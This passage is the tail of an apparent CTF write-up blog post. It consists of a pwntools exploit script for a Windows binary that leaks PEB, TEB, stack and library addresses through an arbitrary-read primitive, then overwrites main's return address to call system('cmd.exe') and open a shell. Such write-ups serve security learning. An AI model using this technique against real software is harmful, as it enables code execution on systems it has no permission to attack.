</span></span><span style=display:flex><span>PebLdr_addr <span style=color:#666>=</span> ntdll_base <span style=color:#666>+</span> <span style=color:#40a070>0x11FC40</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>peb_stored_addr <span style=color:#666>=</span> PebLdr_addr <span style=color:#666>-</span> <span style=color:#40a070>0x34</span>
</span></span><span style=display:flex><span>edit(<span style=color:#40a070>2</span>, <span style=color:#40a070>0x50</span>, p32(peb_stored_addr) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
</span></span><span style=display:flex><span>show(<span style=color:#40a070>3</span>)
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;Show : &#34;</span>)
</span></span><span style=display:flex><span>peb_addr <span style=color:#666>=</span> u32(sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;</span><span style=color:#4070a0;font-weight:700>\r\n</span><span style=color:#4070a0>&#34;</span>, drop <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>True</span>)<span style=color:#666>.</span>ljust(<span style=color:#40a070>4</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>)[:<span style=color:#40a070>4</span>]) <span style=color:#666>-</span> <span style=color:#40a070>0x21c</span>
</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;peb_addr: &#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(peb_addr))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>teb_addr <span style=color:#666>=</span> peb_addr <span style=color:#666>+</span> <span style=color:#40a070>0x3000</span>
</span></span><span style=display:flex><span>edit(<span style=color:#40a070>2</span>, <span style=color:#40a070>0x50</span>, p32(teb_addr) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
</span></span><span style=display:flex><span>show(<span style=color:#40a070>3</span>)
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;Show : &#34;</span>)
</span></span><span style=display:flex><span>stack_end <span style=color:#666>=</span> u32(sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;</span><span style=color:#4070a0;font-weight:700>\r\n</span><span style=color:#4070a0>&#34;</span>, drop <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>True</span>)<span style=color:#666>.</span>ljust(<span style=color:#40a070>4</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>)[:<span style=color:#40a070>4</span>])
</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;stack_end: &#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(stack_end))
</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;start search return addr&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>edit(<span style=color:#40a070>2</span>, <span style=color:#40a070>0x50</span>, p32(image_base <span style=color:#666>+</span> <span style=color:#40a070>0x30C8</span>) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
</span></span><span style=display:flex><span>show(<span style=color:#40a070>3</span>)
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;Show : &#34;</span>)
</span></span><span style=display:flex><span>puts_addr <span style=color:#666>=</span> u32(sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;</span><span style=color:#4070a0;font-weight:700>\r\n</span><span style=color:#4070a0>&#34;</span>, drop <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>True</span>)<span style=color:#666>.</span>ljust(<span style=color:#40a070>4</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>)[:<span style=color:#40a070>4</span>])
</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;puts_addr: &#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(puts_addr))
</span></span><span style=display:flex><span>system_addr <span style=color:#666>=</span> puts_addr <span style=color:#666>-</span> <span style=color:#40a070>0x100B89F0</span> <span style=color:#666>+</span> <span style=color:#40a070>0x100EFDA0</span>
</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;system_addr: &#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(system_addr))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>main_ret_val <span style=color:#666>=</span> image_base <span style=color:#666>+</span> <span style=color:#40a070>0x193B</span>
</span></span><span style=display:flex><span>main_ret_addr <span style=color:#666>=</span> (stack_end <span style=color:#666>&amp;</span> <span style=color:#40a070>0xFFFFF000</span>) <span style=color:#666>+</span> <span style=color:#40a070>0x1000</span> <span style=color:#666>-</span> <span style=color:#40a070>0x4</span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>while</span> <span style=color:#40a070>1</span>:
</span></span><span style=display:flex><span>    ret_val <span style=color:#666>=</span> read_every_where(main_ret_addr)
</span></span><span style=display:flex><span>    log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;in &#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(main_ret_addr) <span style=color:#666>+</span> <span style=color:#4070a0>&#34; : &#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(ret_val))
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> ret_val <span style=color:#666>==</span> main_ret_val:
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>break</span>
</span></span><span style=display:flex><span>    main_ret_addr <span style=color:#666>=</span> main_ret_addr <span style=color:#666>-</span> <span style=color:#40a070>0x4</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;found main_ret_addr: &#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(main_ret_addr))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>payload <span style=color:#666>=</span> p32(system_addr) <span style=color:#666>+</span> p32(<span style=color:#40a070>0xDEADBEEF</span>) 
</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p32(main_ret_addr <span style=color:#666>+</span> <span style=color:#40a070>0x20</span>) <span style=color:#666>+</span> p32(<span style=color:#40a070>0</span>)
</span></span><span style=display:flex><span>payload <span style=color:#666>=</span> payload<span style=color:#666>.</span>ljust(<span style=color:#40a070>0x20</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\xAA</span><span style=color:#4070a0>&#39;</span>) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;cmd.exe</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>
</span></span><span style=display:flex><span>edit(<span style=color:#40a070>2</span>, <span style=color:#40a070>0x50</span>, p32(main_ret_addr) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
</span></span><span style=display:flex><span>edit(<span style=color:#40a070>3</span>, <span style=color:#40a070>0x50</span>, payload <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;choice?&#34;</span>, <span style=color:#4070a0>&#39;5&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>interactive()
</span></span></code></pre></div><p><img src=https://www.cjovi.icu/usr/uploads/2022/04/4152202080.png alt=QQ截图20220404112505.png></p></section><div class=post-tags></div></article></main><footer><div style=display:flex><a class=soc href=https://github.com/chujDK rel=me title=GitHub><i data-feather=github></i></a>
<a class=border></a><a class=soc href=https://twitter.com/jchu95495236 rel=me title=Twitter><i data-feather=twitter></i></a>
<a class=border></a></div><div class=footer-info>2023 <a href=https://github.com/athul/archie>Archie Theme</a> | Built with <a href=https://gohugo.io>Hugo</a></div></footer><script>feather.replace()</script></div></body></html>